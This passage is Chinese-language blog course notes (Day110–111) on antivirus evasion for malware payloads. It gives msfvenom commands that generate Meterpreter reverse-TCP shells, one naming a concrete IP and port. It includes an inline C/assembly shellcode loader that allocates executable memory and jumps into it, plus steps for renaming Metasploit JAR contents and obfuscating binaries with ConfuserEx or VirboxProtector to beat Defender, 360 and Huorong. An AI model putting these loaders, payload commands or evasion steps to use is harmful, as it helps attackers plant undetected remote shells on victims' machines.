title="替换后，打开Ollydbg，将exe文件拖拽进去反编译，找到空白处，将上面的花指令粘贴到此处"></a>替换后，打开Ollydbg，将exe文件拖拽进去反编译，找到空白处，将上面的花指令粘贴到此处</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230506205150820.png" alt="image-20230506205150820"></p><h6 id="修改后全选内容右键"><a href="#修改后全选内容右键" class="headerlink" title="修改后全选内容右键"></a>修改后全选内容右键</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230506205527149.png" alt="image-20230506205527149"></p><h6 id="选择全部复制"><a href="#选择全部复制" class="headerlink" title="选择全部复制"></a>选择全部复制</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230506205545080.png" alt="image-20230506205545080"></p><h6 id="保存为新文件"><a href="#保存为新文件" class="headerlink" title="保存为新文件"></a>保存为新文件</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230506205637669.png" alt="image-20230506205637669"></p><ul><li><h5 id="内联C混编"><a href="#内联C混编" class="headerlink" title="内联C混编"></a>内联C混编</h5></li></ul><p>int main() {</p><p>​    LPVOID lp &#x3D; GetProcAddress(LoadLibraryA(“kernel32.dll”), “VirtualAlloc”);</p><p>​    size_t dw_size &#x3D; sizeof(buf);</p><p>​    void* exec &#x3D; NULL;</p><p>​    __asm</p><p>​    {</p><p>​        push 0x40; &#x2F;&#x2F;可读可写可执行页参数入栈</p><p>​        push 0x1000; &#x2F;&#x2F;MEM_COMMIT参数值入栈</p><p>​        mov eax, dw_size; &#x2F;&#x2F;定义空间大小</p><p>​        push eax; &#x2F;&#x2F;将空间大小入栈</p><p>​        push 0; &#x2F;&#x2F;由系统自行决定内存空间起始地址入栈</p><p>​        mov eax, lp; &#x2F;&#x2F;移动到virtualAlloc函数地址</p><p>​        call eax; &#x2F;&#x2F;运行该函数</p><p>​        mov exec, eax;&#x2F;&#x2F;调用地址</p><p>​    }</p><p>​    LPVOID op &#x3D; GetProcAddress(LoadLibraryA(“kernel32.dll”), “RtlMoveMemory”);</p><p>​    __asm</p><p>​    {</p><p>​        mov eax, dw_size;</p><p>​        push eax;</p><p>​        lea eax, buf;</p><p>​        push eax;</p><p>​        mov ecx, exec;</p><p>​        push ecx;</p><p>​        mov eax, op;</p><p>​        call eax;</p><p>​    }</p><p>​    __asm</p><p>​    {</p><p>​        jmp exec;</p><p>​    }</p><p>​    return 0;</p><p>}</p><h3 id="JAVA-ShellCode-源码修改-amp-打包EXE-MSF（不是很实用）"><a href="#JAVA-ShellCode-源码修改-amp-打包EXE-MSF（不是很实用）" class="headerlink" title="#JAVA-ShellCode-源码修改&amp;打包EXE-MSF（不是很实用）"></a>#JAVA-ShellCode-源码修改&amp;打包EXE-MSF（不是很实用）</h3><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504093126658.png" alt="image-20230504093126658"></p><h5 id="1、JAR包源码特征修改免杀（对方有java环境）"><a href="#1、JAR包源码特征修改免杀（对方有java环境）" class="headerlink" title="1、JAR包源码特征修改免杀（对方有java环境）"></a>1、JAR包源码特征修改免杀（对方有java环境）</h5><ul><li><p>msf生成jar包：</p><p> msfvenom -p java&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;x.x.x.x LPORT&#x3D;xxxx -f jar -o msf.jar </p></li><li><p>-Jar反编译导出-jdgui</p></li><li><p>-修改上线配置-config</p></li><li><p>-修改启动主类-MANIFEST.MF</p></li><li><p>-修改执行代码-Main.java</p></li><li><p>-打包class-javac Main.java</p></li><li><p>-编译jar-jar cvfm xiaodi.jar META-INF&#x2F;MANIFEST.MF .</p></li></ul><h6 id="反编译后导出"><a href="#反编译后导出" class="headerlink" title="反编译后导出"></a>反编译后导出</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504102810833.png" alt="image-20230504102810833"></p><h6 id="把这些敏感文件名修改，将metasploit-dat改为config，将metasploit里面的payload-java剪切到根目录，改名为Main-java，并删除metasploit目录"><a href="#把这些敏感文件名修改，将metasploit-dat改为config，将metasploit里面的payload-java剪切到根目录，改名为Main-java，并删除metasploit目录" class="headerlink" title="把这些敏感文件名修改，将metasploit.dat改为config，将metasploit里面的payload.java剪切到根目录，改名为Main.java，并删除metasploit目录"></a>把这些敏感文件名修改，将metasploit.dat改为config，将metasploit里面的payload.java剪切到根目录，改名为Main.java，并删除metasploit目录</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504103042498.png" alt="image-20230504103042498"></p><h6 id="将原来的MANTFEST-MF的内容文件名对应也要修改"><a href="#将原来的MANTFEST-MF的内容文件名对应也要修改" class="headerlink" title="将原来的MANTFEST.MF的内容文件名对应也要修改"></a>将原来的MANTFEST.MF的内容文件名对应也要修改</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504103322448.png" alt="image-20230504103322448"></p><h6 id="修改成"><a href="#修改成" class="headerlink" title="修改成"></a>修改成</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504103517868.png" alt="image-20230504103517868"></p><h6 id="也可以修改成"><a href="#也可以修改成" class="headerlink" title="也可以修改成"></a>也可以修改成</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504103613464.png" alt="image-20230504103613464"></p><h6 id="原来代码里面，str4是从metasploit-dat里面获取的ip地址，j是从metasploit-dat获取端口，由于将从metasploit-dat删了，所以在代码里面定义"><a href="#原来代码里面，str4是从metasploit-dat里面获取的ip地址，j是从metasploit-dat获取端口，由于将从metasploit-dat删了，所以在代码里面定义" class="headerlink" title="原来代码里面，str4是从metasploit.dat里面获取的ip地址，j是从metasploit.dat获取端口，由于将从metasploit.dat删了，所以在代码里面定义"></a>原来代码里面，str4是从metasploit.dat里面获取的ip地址，j是从metasploit.dat获取端口，由于将从metasploit.dat删了，所以在代码里面定义</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504103717412.png" alt="image-20230504103717412"></p><h6 id="进行修改后"><a href="#进行修改后" class="headerlink" title="进行修改后"></a>进行修改后</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504103907864.png" alt="image-20230504103907864"></p><h6 id="最后一共有如下文件"><a href="#最后一共有如下文件" class="headerlink" title="最后一共有如下文件"></a>最后一共有如下文件</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504104123446.png" alt="image-20230504104123446"></p><h6 id="打包成class"><a href="#打包成class" class="headerlink" title="打包成class"></a>打包成class</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504104112070.png" alt="image-20230504104112070"></p><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504104200072.png" alt="image-20230504104200072"></p><h6 id="打包成jar文件（实现了通杀）"><a href="#打包成jar文件（实现了通杀）" class="headerlink" title="打包成jar文件（实现了通杀）"></a>打包成jar文件（实现了通杀）</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504104304582.png" alt="image-20230504104304582"></p><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504104327570.png" alt="image-20230504104327570"></p><h5 id="2、JAR包打包EXE执行免杀（对方无java环境，不推荐使用）"><a href="#2、JAR包打包EXE执行免杀（对方无java环境，不推荐使用）" class="headerlink" title="2、JAR包打包EXE执行免杀（对方无java环境，不推荐使用）"></a>2、JAR包打包EXE执行免杀（对方无java环境，不推荐使用）</h5><p>安装：exe4j Inno进行打包</p><p>exe4j-下载链接：<a href="https://exe4j.apponic.com/">https://exe4j.apponic.com/</a></p><p>inno-下载链接：<a href="https://jrsoftware.org/isdl.php">https://jrsoftware.org/isdl.php</a></p><p>操作说明：<a href="https://www.jb51.net/article/236000.htm">Java jar打包成exe应用程序的详细步骤_java_脚本之家 (jb51.net)</a></p><h6 id="生成exe文件后不用马上打开，因为在没有java环境下仍然运行不了"><a href="#生成exe文件后不用马上打开，因为在没有java环境下仍然运行不了" class="headerlink" title="生成exe文件后不用马上打开，因为在没有java环境下仍然运行不了"></a>生成exe文件后不用马上打开，因为在没有java环境下仍然运行不了</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504112239696.png" alt="image-20230504112239696"></p><h6 id="照着上面的操作说明一步步完成（复杂，太拉了，生成了几十MB的exe文件，免杀效果还不好）"><a href="#照着上面的操作说明一步步完成（复杂，太拉了，生成了几十MB的exe文件，免杀效果还不好）" class="headerlink" title="照着上面的操作说明一步步完成（复杂，太拉了，生成了几十MB的exe文件，免杀效果还不好）"></a>照着上面的操作说明一步步完成（复杂，太拉了，生成了几十MB的exe文件，免杀效果还不好）</h6>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Day110 免杀对抗-GO&amp;C#&amp;反VT沙盒&amp;逆向调试&amp;参数加载&amp;资源分离&amp;混淆加密</title>
    <link href="http://example.com/2023/04/27/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/"/>
    <id>http://example.com/2023/04/27/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/</id>
    <published>2023-04-27T00:34:13.000Z</published>
    <updated>2023-05-02T12:31:27.635Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/8TLUjSoX6pXaftunKDWHlw.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、C#-混淆&amp;分离&amp;反调试</p><p>2、GO-混淆&amp;分离&amp;反调试</p><p>3、成品程序-包含反调试VT</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>编译代码面-ShellCode-混淆</p><p>编译代码面-编辑执行器-编写</p><p>编译代码面-分离加载器-编写</p><p>程序文件面-特征码定位-修改</p><p>程序文件面-加壳花指令-资源</p><p>代码加载面-Dll反射劫持-加载</p><p>权限逻辑面-杀毒进程干扰-结束</p><p>工具数据面-通讯内存流量-动态</p><h5 id="对抗目标："><a href="#对抗目标：" class="headerlink" title="对抗目标："></a>对抗目标：</h5><p>X60 Defender 某绒 管家 VT等</p><h5 id="编程语言："><a href="#编程语言：" class="headerlink" title="编程语言："></a>编程语言：</h5><p>C&#x2F;C++  Python C# Go Powershell Ruby Java ASM等</p><h5 id="涉及技术："><a href="#涉及技术：" class="headerlink" title="涉及技术："></a>涉及技术：</h5><p>ShellCode混淆加密，无文件落地，分离拆分，白名单，DLL加载，Syscall，加壳加花，</p><p>资源修改，特征修改，二次开发CS，内存休眠，进程注入，反沙盒，反调试，CDN解析等</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-C-amp-NET-ShellCode-原型-amp-混淆"><a href="#➢-C-amp-NET-ShellCode-原型-amp-混淆" class="headerlink" title="➢ C#&amp;NET-ShellCode-原型&amp;混淆"></a>➢ C#&amp;NET-ShellCode-原型&amp;混淆</h4><h4 id="➢-GO-ShellCode-原型-amp-混淆-amp-分离"><a href="#➢-GO-ShellCode-原型-amp-混淆-amp-分离" class="headerlink" title="➢ GO-ShellCode-原型&amp;混淆&amp;分离"></a>➢ GO-ShellCode-原型&amp;混淆&amp;分离</h4><h4 id="➢-C-amp-GO-成品程序-保护反调试VT"><a href="#➢-C-amp-GO-成品程序-保护反调试VT" class="headerlink" title="➢ C#&amp;GO-成品程序-保护反调试VT"></a>➢ C#&amp;GO-成品程序-保护反调试VT</h4></blockquote><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502162648112.png" alt="image-20230502162648112"></p><h3 id="C-NET"><a href="#C-NET" class="headerlink" title="C# .NET"></a>C# .NET</h3><h5 id="1、原型"><a href="#1、原型" class="headerlink" title="1、原型"></a>1、原型</h5><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;47.94.236.117 LPORT&#x3D;6688 -e x86&#x2F;shikata_ga_nai -i 15 -f csharp</p><h5 id="2、混淆"><a href="#2、混淆" class="headerlink" title="2、混淆"></a>2、混淆</h5><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;47.94.236.117 LPORT&#x3D;6688 -f csharp</p><h5 id="3、文件混淆-反调试VT"><a href="#3、文件混淆-反调试VT" class="headerlink" title="3、文件混淆-反调试VT"></a>3、文件混淆-反调试VT</h5><ul><li><p>开源-ConfuserEx</p></li><li><p>付费-VirboxProtector</p></li></ul><h5 id="（1）ConfuserEx："><a href="#（1）ConfuserEx：" class="headerlink" title="（1）ConfuserEx："></a>（1）ConfuserEx：</h5><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502152311788.png" alt="image-20230502152311788"></p><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502152529723.png" alt="image-20230502152529723"></p><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502152611614.png" alt="image-20230502152611614"></p><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502152720041.png" alt="image-20230502152720041"></p><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502152757109.png" alt="image-20230502152757109"></p><h6 id="会在protected目录生成新的exe文件"><a href="#会在protected目录生成新的exe文件" class="headerlink" title="会在protected目录生成新的exe文件"></a>会在protected目录生成新的exe文件</h6><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502153139446.png" alt="image-20230502153139446"></p><h6 id="还是能够反编译，但是出现了很多的未知代码，将这个文件放到DF和x绒上都可以过，过不了x60"><a href="#还是能够反编译，但是出现了很多的未知代码，将这个文件放到DF和x绒上都可以过，过不了x60" class="headerlink" title="还是能够反编译，但是出现了很多的未知代码，将这个文件放到DF和x绒上都可以过，过不了x60"></a>还是能够反编译，但是出现了很多的未知代码，将这个文件放到DF和x绒上都可以过，过不了x60</h6><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502153219146.png" alt="image-20230502153219146"></p><h5 id="（2）VirboxProtector"><a href="#（2）VirboxProtector" class="headerlink" title="（2）VirboxProtector"></a>（2）VirboxProtector</h5><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502153444891.png" alt="image-20230502153444891"></p><h6 id="这里全过了"><a href="#这里全过了" class="headerlink" title="这里全过了"></a>这里全过了</h6><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502154604408.png" alt="image-20230502154604408"></p><h3 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h3><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502163949520.png" alt="image-20230502163949520"></p><h5 id="运行1-go脚本"><a href="#运行1-go脚本" class="headerlink" title="-运行1.go脚本"></a>-运行1.go脚本</h5><p>go run 1.go</p><p>cs生成payload.c</p><p>将”\“换成””,0”替换成bit流数据</p><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502160731008.png" alt="image-20230502160731008"></p><p>替换到1.go的shellcode处</p><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502164222199.png" alt="image-20230502164222199"></p><h5 id="编译1-go脚本"><a href="#编译1-go脚本" class="headerlink" title="-编译1.go脚本"></a>-编译1.go脚本</h5><p>go build 1.go（执行即可上线）</p><h5 id="没有弹窗的exe命令编译："><a href="#没有弹窗的exe命令编译：" class="headerlink" title="-没有弹窗的exe命令编译："></a>-没有弹窗的exe命令编译：</h5><p>go build -ldflags&#x3D;”-H windowsgui -w -s” 1.go （生成exe文件）</p><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502162319857.png" alt="image-20230502162319857"></p><h5 id="1、Golang-Shellcode编译-1-go"><a href="#1、Golang-Shellcode编译-1-go" class="headerlink" title="1、Golang-Shellcode编译-1.go"></a>1、Golang-Shellcode编译-1.go</h5><h5 id="2、Golang-编码加密-Xor-amp-Aes混淆-2-amp-3-go（只过DF）"><a href="#2、Golang-编码加密-Xor-amp-Aes混淆-2-amp-3-go（只过DF）" class="headerlink" title="2、Golang-编码加密-Xor&amp;Aes混淆-2&amp;3.go（只过DF）"></a>2、Golang-编码加密-Xor&amp;Aes混淆-2&amp;3.go（只过DF）</h5><p>Xor Aes Base64 参数提交</p><p>演示AES加密参数提交：</p><h6 id="3-go是本地加密shellcode的文件"><a href="#3-go是本地加密shellcode的文件" class="headerlink" title="3.go是本地加密shellcode的文件"></a>3.go是本地加密shellcode的文件</h6><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502175651749.png" alt="image-20230502175651749"></p><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502175747795.png" alt="image-20230502175747795"></p><h6 id="3-1-go是解密的脚本，即执行shellcode的脚本，这里要传入上面的key和code值"><a href="#3-1-go是解密的脚本，即执行shellcode的脚本，这里要传入上面的key和code值" class="headerlink" title="3.1.go是解密的脚本，即执行shellcode的脚本，这里要传入上面的key和code值"></a>3.1.go是解密的脚本，即执行shellcode的脚本，这里要传入上面的key和code值</h6><p><img 